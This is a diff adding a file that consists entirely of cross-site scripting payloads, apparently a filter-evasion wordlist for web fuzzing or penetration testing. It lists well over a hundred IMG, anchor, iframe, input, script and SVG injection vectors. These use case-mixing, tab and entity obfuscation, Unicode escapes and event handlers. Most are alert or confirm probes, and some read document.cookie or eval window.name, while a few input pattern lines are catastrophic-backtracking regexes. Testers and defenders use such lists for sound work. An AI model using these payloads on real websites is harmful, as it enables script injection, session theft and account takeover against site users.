@@ -1,0 +1,134 @@
+<IMG SRC=JaVaScRiPt:confirm(document.location)>
+<IMG SRC=JaVaScRiPt:confirm(&quot;XSS<WBR>&quot;)>
+<IMG SRC=JaVaScRiPt:prompt(document.location)> 
+<IMG SRC="jav	ascript:confirm(document.location);">
+<IMG SRC=java%00script:confirm(document.location)>
+<IMG SRC=`javascript:confirm(1)`>
+<IMG SRC=javascript:confirm(String.fromCharCode(88,83,83))>
+<IMG SRC=`javascript:confirm(document.cookie)`>
+<IMG SRC="javascript:confirm(document.location)"
+<IMG SRC="javascript:confirm(document.location);">
+<IMG SRC=javascript:confirm(document.location)>
+<IMG SRC=javascript:confirm(&quot;XSS&quot;)>
+<IMG SRC=javascript:prompt(document.location)>
+<IMG SRC="jav&#x09;ascript:confirm(<WBR>document.location);">
+<IMG SRC="jav&#x09;ascript:confirm(document.location);">
+<IMG SRC="jav&#x0A;ascript:confirm(<WBR>document.location);">
+<IMG SRC="jav&#x0A;ascript:confirm(document.location);">
+<IMG SRC="jav&#x0D;ascript:confirm(<WBR>document.location);">
+<IMG SRC="jav&#x0D;ascript:confirm(document.location);">
+<a href="javascript:data:alert(1)">click</a>
+<a href="javascript:_e({}, 'cvml', 'test-01-%27-alert(1)-%27');" target="_blank">test</a>
+<a href="javascript:'hello'" rel="sidebar">x</a>
+<a href="javascript:history:alert(this.history.length)">click</a>
+<a href='javascript:http://@cc_on/confirm%28location%29'>click</a>
+<a href="javascript:name">CLICK</a>
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:confirm(1)&NewLine;>X</a>
+<a href=javascript&.x3A;confirm&(x28;1&)x29;//=>clickme
+a href="j&#x26;#x26#x41;vascript:confirm%252831337%2529">Hello</a>
+"><iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<iframe width=0 height=0 src="javascript:confirm(1)">
+<iframe/%00/ src=javaSCRIPT&colon;confirm(1)
+<iframe%20onload="new%20Promise($=>alert(location))">
+"><iframe%20src="http://google.com"%%203E
+<iframe/*%%%%25%%%25*/src='javascript:vbscript:%0b%0a/**/;//:http://www.google.com/?=%0a/**/javascript:%0a/*oleeeeeeeeeeeeeee*/alert(2);'>
+iframe.contentWindow.location.constructor.prototype
+<iframe><iframe src=javascript:confirm(4)></iframe>
+<iframe/name="if(0){\u0061lert(1)}else{\u0061lert(1)}"/onload="eval(name)";>
+<iframe/name="if(0){\u0061lert(1)}else{\u0061lert(1)}"/onload="eval(name)";> 
+<iframe/name="javascript:confirm(1);"onload="while(1){eval(name);}">
+"><iframe/onreadystatechange=confirm(1)
+<iframe/onreadystatechange=confirm(1)
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+"><iframe/src \/\/onload = prompt(1)
+<iframe/src \/\/onload = prompt(1)
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<iframe/src="data:text/html,<svg &#111;&#110;load=confirm(1)>">
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+<iframe/src=j&Tab;av&Tab;as&Tab;cri&Tab;pt&Tab;:co&Tab;nfir&Tab;m&Tab;(&Tab;&Tab;1&Tab;)>
+<iframe/src='javascript:if(null==null){javascript:0?1:confirm(1);}'>
+<iframe/src='javascript:if(null==null){javascript:0?1:confirm(1);}'>
+<!--[if]><script>alert(1)</script --><!--[if<img src=x onerror=alert(2)//]> -->
+<!--[if]><script>confirm(1)</script -->
+<image src=`` onerror=setTimeout/*("__")*/`\u0061lert\u00281\u0029/**/`>
+"><img src=x onerror=prompt(1);>
+"><img src=x onerror=prompt(document.location);>#"><img src=x onerror=prompt(document.location);>
+"><img src=x onerror=prompt("xss");>#"><img src=x onerror=prompt("xss");>
+"><img src=x onerror=window.open('https://www.google.com/');>
+"<img src=x onerror=x.onerror=confirm(1);prompt(2);confirm(/XSS/.source);prompt(String.fromCharCode(88,83,83))>"
+"\"><img src=x onerror=x.onerror=confirm(1);prompt(2);confirm(/XSS/.source);prompt(String.fromCharCode(88,83,83))>",
+<input autofocus onfocus=confirm(1)>
+<input formaction=JaVaScript:confirm(document.cookie)>
+<input id=x><input id=x><script>confirm(x)</script>
+<input onblur=focus() autofocus><input>
+<input onblur=write(1) autofocus><input autofocus>
+<><input onfocus=confirm(0) autofocus <!--
+<input onfocus=write(1) autofocus>
+<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaa!>
+<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>
+<input type=hidden onformchange=confirm(1)/>
+<input type=hidden style=`x:expression(confirm(1))`>
+<input type=hidden style=`x:expression(confirm(4))`>
+<script>a='abc\*chr*\';log(*num*)//def';</script>
+<script>alert//.%0D(1)</script>
+<script<{alert(1)}/></script </>
+¼script¾alert(¢xss¢)¼/script¾
+<script>a="<!--";//</script>alert(1)--></script>
+<script>a="<%"//</script>alert(1)//%></script>
+<script>+{[atob`dG9TdHJpbmc`]()alert`1`}</script>
+"'`><script>a=/xss;*chr*;i=0;log(*num*);a/i;</script>
+"`'><script>*chr*log(*num*)</script>
+<script>class a{@alert get}</script>
+"<script>'confirm(0)%3B<%2Fscript>"
+"\"><script>'confirm(0)%3B<%2Fscript>",
+<script>'confirm(0)%3B<%2Fscript>
+><script>'confirm(0)%3B<%2Fscript>
+"<script>confirm(0);</script>"
+"><"script">"confirm(0)"</"script">
+"\"><script>confirm(0)</script>",
+<script>confirm(0);</script>
+><script>confirm(0)</script>
+"'><script>confirm(1)</script>",
+<sc'+'ript>confirm(1)</script>
+<script>confirm(1)</script>
+<script>x=""!=prompt(9)!="";y=42;</script>
+<script>x=""%prompt(9)%"";y=42;</script>
+<script>x=""&&prompt(9)&&"";y=42;</script>
+<script>x=""&prompt(9)&"";y=42;</script>
+<script>x=""*prompt(9)*"";y=42;</script>
+<script>x=""+prompt(9)+"";y=42;</script>
+<script>x=""-prompt(9)-"";y=42;</script>
+<script>x=""/prompt(9)/"";y=42;</script>
+<script>x=""<<prompt(9)<<"";y=42;</script>
+<script>x=""<=prompt(9)<="";y=42;</script>
+<script>x=""<prompt(9)<"";y=42;</script>
+<script>x=""===prompt(9)==="";y=42;</script>
+<script>x=""==prompt(9)=="";y=42;</script>
+<script>x="">=prompt(9)>="";y=42;</script>
+<script>x="">>>prompt(9)>>>"";y=42;</script>
+<script>x="">>prompt(9)>>"";y=42;</script>
+<script>x="">prompt(9)>"";y=42;</script>
+<script>x=""?prompt(9):"";y=42;</script>
+<script>x=""^prompt(9)^"";y=42;</script>
+<script>x=""|prompt(9)|"";y=42;</script>
+<script>x=""||prompt(9)||"";y=42;</script>
+</script/x><svg onload=alert(domain)>
+<svg id=1 onload=confirm(1)> 
+<svg </onload ="1> (_=alert,_(1)) "">
+<svg onload=0?1:alert(9)>
+<svg onload=1?alert(9):0>
+>"><svg onload=alert(0)>
+<svg onload=confirm(1)
+"><svg onload="confirm(7)">
+<svg onload="confirm(7)">
+<svg onload=eval(URL)>
+<svg onload=eval(document.cookie)>
+<svg onload=eval(window.name)>
+<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
+<svg onresize="alert(1)">
+<svg/onload=window.onerror=alert;throw/XSS/;//
+<svg/onload=window.onerror=confirm;throw/5/;//
+<svg/onload=window.onerror=confirm;throw/XSS/;//
+<svg/onload=window.onerror=confirm;throw/XSS/;//"
